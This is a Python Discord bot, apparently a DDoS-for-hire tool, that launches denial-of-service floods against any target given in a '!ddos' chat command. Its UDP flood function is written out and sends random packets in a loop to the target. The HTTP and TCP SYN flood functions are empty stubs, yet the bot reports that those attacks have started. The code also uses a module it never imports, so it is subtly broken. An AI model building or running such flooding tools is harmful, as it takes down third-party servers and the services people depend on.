import discord
import os
import asyncio
import threading
import socket
import random

TOKEN = os.getenv('DISCORD_BOT_TOKEN')

client = discord.Client()

def udp_flood(target, port, duration):
    timeout = time.time() + duration
    while time.time() < timeout:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)
        sock.sendto(bytes, (target, port))
    print("UDP Flood Attack Finished!")

def http_flood(target, duration):
    # Implement HTTP flood method here
    pass

def tcp_syn_flood(target, port, duration):
    # Implement TCP SYN flood method here
    pass

@client.event
async def on_ready():
    print(f'Logged in as {client.user.name}')
    await client.change_presence(activity=discord.Game(name="Get Fucked By Yves"))
    print('------')

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.content.startswith('!ddos'):
        args = message.content.split(' ')
        if len(args) < 4:
            await message.channel.send('Insufficient arguments. Usage: !ddos <method> <target> <duration>')
            return
        
        method = args[1]
        target = args[2]
        duration = int(args[3])

        if method.lower() == 'udp':
            port = 80
            udp_thread = threading.Thread(target=udp_flood, args=(target, port, duration))
            udp_thread.start()
            await message.channel.send(f'UDP flood attack started on {target} for {duration} seconds.')
        elif method.lower() == 'http':
            http_thread = threading.Thread(target=http_flood, args=(target, duration))
            http_thread.start()
            await message.channel.send(f'HTTP flood attack started on {target} for {duration} seconds.')
        elif method.lower() == 'tcp_syn':
            port = 80
            tcp_syn_thread = threading.Thread(target=tcp_syn_flood, args=(target, port, duration))
            tcp_syn_thread.start()
            await message.channel.send(f'TCP SYN flood attack started on {target} for {duration} seconds.')
        else:
            await message.channel.send('Invalid DDoS method. Available methods: udp, http, tcp_syn')

client.run(TOKEN)
